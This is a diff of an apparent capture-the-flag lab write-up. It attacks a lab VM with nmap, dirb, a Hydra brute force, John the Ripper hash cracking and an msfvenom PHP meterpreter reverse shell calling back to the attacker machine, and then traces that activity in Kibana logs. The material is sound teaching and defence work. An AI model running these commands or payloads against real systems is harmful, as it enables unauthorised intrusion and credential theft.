@@ -19,9 +19,9 @@ Network Diagram:
 
 First step is to run a quick network scan:
 
-'''bash
+```bash
 nmap -sV -sS 192.168.1.0/24
-'''
+```
 
 The result:
 
@@ -33,9 +33,9 @@ We can see the Capstone VM (IP: 192.168.1.105) is hosting a web service on Port 
 
 To find any hidden files and directories not directly listed on the website we can use Dirbuster (or 'dirb' command from Terminal) by providing it a wordlist to search
 
-'''bash
+```bash
 dirb http://192.168.1.105/ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-'''
+```
 
 The results show us there are two hidden directories:
   1. http://192.168.1.105/company_folders/secret_folder/
@@ -49,9 +49,9 @@ While trying to access the /secret_folder/ directory we are prompted with a warn
 
 We can try a bruteforcing attack using Hydra and the username "ashton", as well as specifying port 80 and the 'rockyou.txt' wordlist:
 
-'''bash
+```bash
 hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
-'''
+```
 
 The result of the bruteforce attack eventually returns the password found for user 'ashton' - leopoldo
 
@@ -66,9 +66,9 @@ The personal note includes information about how to connect to /webdav/ as well 
 We can try saving the hash into a file named "hash.txt" and use John the Ripper or a website such as https://crackstation.net/ to try and crack the password.
 For using John the Ripper:
 
-'''bash
+```bash
 john hash.txt --format=raw-md5 --show
-'''
+```
 
 The result is the password in plain text: linux4u and we can try to login:
 
@@ -80,9 +80,9 @@ Now that we can login to the WebDav service we can try and upload malicious cont
 
 We will try and craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect back to our attacker machine, we will need to specify the LHOST as the Kali VM's IP address and the LPORT as 4444:
 
-'''bash
+```bash
 msfvenom -p php/meterpreter/reverse_tcp -lhost=192.168.1.90 lport=4444 > shell.php
-'''
+```
 
 Now, we can drag and drop the file in the WebDav folder, so we can access it later from the web browser:
 
@@ -94,23 +94,23 @@ Metasploit Console
 
 To fire up Metasploit we can simply run the following command on our Kali machine:
 
-'''bash
+```bash
 msfconsole
-'''
+```
 
 Once metasploit opens up, we can select the following exploit:
 
-'''bash
+```bash
 use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
-'''
+```
 
 Before we run the exploit, we have to set the LHOST. We can see this by running the "options" command. We can notice port 4444 is the default port, and is already set, mathcing the php reverse shell we created above. To set the LHOST and start the session, we run the following:
 
-'''bash
+```bash
 set LHOST 192.168.1.90
 run
-'''
+```
 
 Now, we can navigate to http://192.168.1.105/webdav/shell.php to start the reverse shell. If everything was executed correctly, we should get a meterpreter shell on our Kali machine:
 
@@ -118,9 +118,9 @@ Now, we can navigate to http://192.168.1.105/webdav/shell.php to start the rever
 
 To find the hidden flag, we can search directly from the meterpreter shell, or we can fire up a shell on the target machine, then run the following:
 
-'''bash
+```bash
 find / -name flag.txt 2>/dev/null
-'''
+```
 
 ![Screen Shot 2022-02-15 at 18 51 59 PM](https://user-images.githubusercontent.com/90374994/156853571-5cc65352-fdca-428f-a479-374bbfbe777a.png)
 
@@ -169,8 +169,7 @@ Search for the following panels and add them to the dashboard:
 
 Now, we are ready to dig in, and find the log events we are looking for.
 
-Navigate to the "Discover" tab and change the filter dropdown to "packetbeat" as this is where the logs will be located.
-
+Navigate to the "Discover" tab and change the filter dropdown to "packetbeat" as this is where the logs will be located. We should also alter the timeline by narrowing it down to only the times we would like to analyze the logs. In this case we used "Feb 14, 2022 @ 00:00:00.0 - Feb 21, 2022 @ 00:00:00.0", however that is a broad range for a normal live environment, so a narrower range could be used in real life example.
 
 First, let's identify the port scan. We can filter for "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and destination.bytes<60"
 
@@ -192,7 +191,9 @@ Here, we can see there were 17,866 brute force attempts made to find the correct
 
 Third, let's look at the WebDAV connection logs. We can apply the following filter: "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and url.full:"http://192.168.1.105/webdav/"" and we can further narrow it down to when the shell.php was accessed by changing the URL in the search bar: "url.full:"http://192.168.1.105/webdav/shell.php""
 
+![webdav](https://user-images.githubusercontent.com/90374994/156858793-51b1a743-2e60-469f-8a13-939d42baa9ae.png)
 
+![webdav_shell](https://user-images.githubusercontent.com/90374994/156858816-6bb47b62-6b10-4183-a55c-c21df6d2d74a.png)
 
 
 
